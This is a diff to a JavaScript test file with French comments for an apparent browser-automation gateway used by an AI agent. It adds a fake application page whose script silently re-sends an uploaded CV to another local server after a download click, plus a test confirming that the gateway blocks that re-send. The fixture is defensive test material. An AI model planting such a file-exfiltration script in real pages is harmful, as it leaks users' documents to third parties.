@@ -60,11 +60,19 @@ async function setup(t) {
   const remote = `http://localhost:${storagePort}`;
   stored.remote = remote;
   const site = http.createServer((req, res) => {
+    if (req.url === '/fichier-FICTIF.txt') {
+      res.writeHead(200, {
+        'content-type': 'text/plain; charset=utf-8',
+        'content-disposition': 'attachment; filename="fichier-FICTIF.txt"',
+      });
+      return res.end('FICTIF');
+    }
     res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
     res.end(`<!doctype html><title>Candidature FICTIVE</title>
       <p>Site FICTIF de test.</p>
       <label>CV <input type="file" id="cv"></label>
       <button type="button" id="mesure">Afficher les détails</button>
+      <a id="telecharger" href="/fichier-FICTIF.txt" download>Télécharger le guide FICTIF</a>
       <script>
         fetch('${remote}/telemetry', { method: 'POST', mode: 'no-cors', body: 'mesure FICTIVE' });
         document.getElementById('cv').addEventListener('change', (event) => {
@@ -104,6 +112,14 @@ async function setup(t) {
           fetch('${remote}/chunk', { method: 'POST', mode: 'no-cors', body: cv.slice(0, 1000) });
           fetch('${remote}/chunk', { method: 'POST', mode: 'no-cors', body: cv.slice(1000) });
         });
+        // Revue Opus du 06/11 : 300 ms après un clic de téléchargement, la page renvoie le CV
+        // vers l'autre site ; le clic de l'agent a refermé la fenêtre, ce renvoi reste bloqué.
+        document.getElementById('telecharger').addEventListener('click', () =>
+          setTimeout(() => {
+            const again = new FormData();
+            again.append('cv', document.getElementById('cv').files[0]);
+            fetch('${remote}/upload', { method: 'POST', mode: 'no-cors', body: again });
+          }, 300));
         document.getElementById('mesure').addEventListener('click', () =>
           fetch('${remote}/telemetry', { method: 'POST', mode: 'no-cors', body: 'clic FICTIF' }));
       </script>`);
@@ -175,5 +191,30 @@ test(
     await new Promise((resolve) => setTimeout(resolve, 500));
     assert.equal(stored.telemetry, 0, 'POST vers un autre site après un clic bloqué');
     assert.deepEqual(click.blockedThirdPartyPosts, [new URL(remoteOf(stored)).host]);
+  },
+);
+
+// Revue Opus du 06/11 (constat 3) : le clic de browser.download ne refermait pas la fenêtre de
+// téléversement (sa fin n'était pas datée) : un envoi du fichier vers un autre site qui le suivait
+// passait, alors qu'après browser.click il reste bloqué.
+test(
+  'E43 FICTIF : un clic de téléchargement referme la fenêtre de téléversement',
+  { skip: !existsSync(CHROME) },
+  async (t) => {
+    const { gateway, origin, stored } = await setup(t);
+    await gateway.call('browser.navigate', { url: origin });
+    await gateway.call('browser.upload', {
+      ref: await refFor(gateway, '#cv'),
+      path: 'cv-FICTIF.pdf',
+    });
+    for (let i = 0; i < 50 && !stored.uploads; i++)
+      await new Promise((resolve) => setTimeout(resolve, 100));
+    assert.equal(stored.uploads, 1);
+    const downloaded = await gateway.call('browser.download', {
+      ref: await refFor(gateway, '#telecharger'),
+    });
+    assert.match(JSON.stringify(downloaded), /fichier-FICTIF/);
+    await new Promise((resolve) => setTimeout(resolve, 1500));
+    assert.equal(stored.uploads, 1, 'le CV est reparti vers l’autre site après le clic');
   },
 );
